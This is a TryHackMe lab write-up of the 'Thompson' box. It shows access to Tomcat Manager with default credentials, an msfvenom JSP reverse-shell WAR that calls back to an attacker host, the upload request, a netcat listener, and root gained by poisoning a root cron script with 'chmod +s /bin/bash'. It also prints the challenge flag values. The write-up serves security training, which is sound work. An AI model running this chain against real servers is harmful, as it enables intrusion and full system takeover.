# 🍅 Thompson

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `thompson` |
| **OS** | Ubuntu 16.04 |
| **Attack Surface** | Apache Tomcat Manager default credentials, WAR file deployment |
| **Privesc** | World-writable cron script → SUID bash |

Thompson exposes Apache Tomcat 8.5.5 with the Manager interface accessible via default credentials. A malicious WAR file containing a JSP reverse shell is uploaded through the Manager UI, landing a shell as the `tomcat` service account. From there, a world-writable shell script in jack's home directory is executed periodically by a root-owned cron job — poisoning it with a `chmod +s /bin/bash` payload escalates to root via SUID bash.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv thompson -oA tcpscan-thompson
```

```
22/tcp   open  ssh    OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
8009/tcp open  ajp13  Apache Jserv (Protocol v1.3)
8080/tcp open  http   Apache Tomcat 8.5.5
```

Three services — SSH is standard, AJP13 on 8009 is Tomcat's internal connector, and Tomcat itself on 8080. AJP is worth noting (Ghostcat territory) but the Manager interface is the faster path here.

### Tomcat Manager

Navigating to `http://thompson:8080/manager/html` prompts for HTTP Basic auth. Default credentials work immediately:

```
tomcat : s3cret
```

Manager is fully accessible — deploy, undeploy, start, stop. WAR upload is the obvious vector.

---

## 💀 Initial Access — Tomcat WAR Upload

### Generate Reverse Shell WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.204.251 LPORT=4444 -f war -o shell.war
```

### Deploy via Manager UI

WAR uploaded through the Manager web interface. The request is a multipart POST to `/manager/html/upload`, authenticated via HTTP Basic (`tomcat:s3cret` base64-encoded) and protected by a CSRF nonce embedded in both the URL and cookie session.

```http
POST /manager/html/upload;jsessionid=B7807BB4F00584EA67CD0772A1865481?org.apache.catalina.filters.CSRF_NONCE=393F7178AF96537CC7FA8A29DF3506D6 HTTP/1.1
Host: thompson:8080
Authorization: Basic dG9tY2F0OnMzY3JldA==
Content-Type: multipart/form-data; boundary=----geckoformboundary34cf6c8f465489198b18752de0b88c57

------geckoformboundary34cf6c8f465489198b18752de0b88c57
Content-Disposition: form-data; name="deployWar"; filename="shell.war"
Content-Type: application/octet-stream

.. snipped ..
```

HTTP 200 — Manager reloads with the newly deployed `/shell` application listed.

### Catch the Shell

```bash
nc -nlvp 4444
```

Trigger execution by browsing to `http://thompson:8080/shell/`.

```
connect to [192.168.204.251] from (UNKNOWN) [10.112.149.132] 57816
```

### Shell Stabilisation

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
stty rows 40 cols 146
alias ll='ls -Flah'; alias cls='clear'; export TERM='xterm'
```

Shell is now `tomcat@ubuntu`.

---

## 🔁 Privilege Escalation — tomcat → root

### Local Enumeration

```bash
id
# uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

sudo -l
# prompts for password — tomcat has no sudo rights

uname -a
# Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019
```

No sudo, no gcc. Check home directories:

```bash
ls -lah /home/jack/
```

```
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
-rw-r--r-- 1 root root   39 Apr 15 07:52 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
```

Two things stand out immediately:

- `id.sh` is world-writable (`rwxrwxrwx`) — any user can modify it
- `test.txt` is owned by `root` and was written recently — something is running `id.sh` as root on a schedule

```bash
cat id.sh
# #!/bin/bash
# id > test.txt

cat test.txt
# uid=0(root) gid=0(root) groups=0(root)
```

Confirmed: root is executing `id.sh` via cron. The output in `test.txt` is `root`'s identity, and the file timestamp updates every minute.

### User Flag

```bash
cat /home/jack/user.txt
# 39400c90bc683a41a8935e4719f181bf
```

### Poison the Cron Script

Since `id.sh` is world-writable, append a SUID payload:

```bash
echo 'chmod +s /bin/bash' >> /home/jack/id.sh
```

The script now reads:

```bash
#!/bin/bash
id > test.txt
chmod +s /bin/bash
```

Watch for the cron to fire:

```bash
watch -n 1 ls -lah /bin/bash
```

Within a minute:

```
-rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash
```

SUID bit is set. Escalate:

```bash
bash -p
```

```
bash-4.3# id
uid=1001(tomcat) gid=1001(tomcat) euid=0(root) egid=0(root) groups=0(root),1001(tomcat)
```

### Root Flag

```bash
cat /root/root.txt
# d89d5391984c0450a95497153ae7ca3a
```

---

## 🗺️ Attack Chain

```
[Apache Tomcat 8.5.5 — Port 8080]
    Manager UI exposed at /manager/html
    Default credentials: tomcat:s3cret
          │
          ▼
[WAR File Upload via Manager UI]
    msfvenom JSP reverse shell → shell.war
    POST /manager/html/upload → HTTP 200
    Browse /shell/ → reverse shell as tomcat
          │
          ▼
[Local Enumeration]
    /home/jack/id.sh — world-writable (rwxrwxrwx)
    /home/jack/test.txt — owned by root, updated every minute
    Cron executes id.sh as root
          │
          ▼
[Cron Script Poisoning]
    Append: chmod +s /bin/bash
    Wait for cron tick (~1 min)
    /bin/bash gains SUID
          │
          ▼
[SUID Bash → Root]
    bash -p → euid=0
    cat /root/root.txt
```

---

## 📌 Key Takeaways

- Default credentials on Tomcat Manager are a direct foothold — `tomcat:s3cret`, `admin:admin`, `manager:manager` should be the first thing checked on any Tomcat instance
- The Manager UI handles CSRF protection via nonce tokens, but once authenticated the WAR deploy flow is straightforward — just grab the nonce from the page source or intercept with Burp
- World-writable scripts executed by root-owned cron jobs are an instant privilege escalation — `find / -writable -name "*.sh" 2>/dev/null` should be routine post-foothold
- AJP on 8009 was present but unnecessary here; in other contexts (Ghostcat, CVE-2020-1938) it would be the primary attack vector
- `watch -n 1 ls -lah /bin/bash` is a clean one-liner for confirming cron execution without spamming commands

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `msfvenom` | Generate JSP reverse shell WAR file |
| Burp Suite | Capture CSRF nonce and deploy WAR via Manager UI |
| `nc` | Reverse shell listener |
| `python3` | Shell stabilisation (pty.spawn) |
| `watch` | Monitor SUID bit on /bin/bash after cron trigger |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `39400c90bc683a41a8935e4719f181bf` |
| `root.txt` | `d89d5391984c0450a95497153ae7ca3a` |
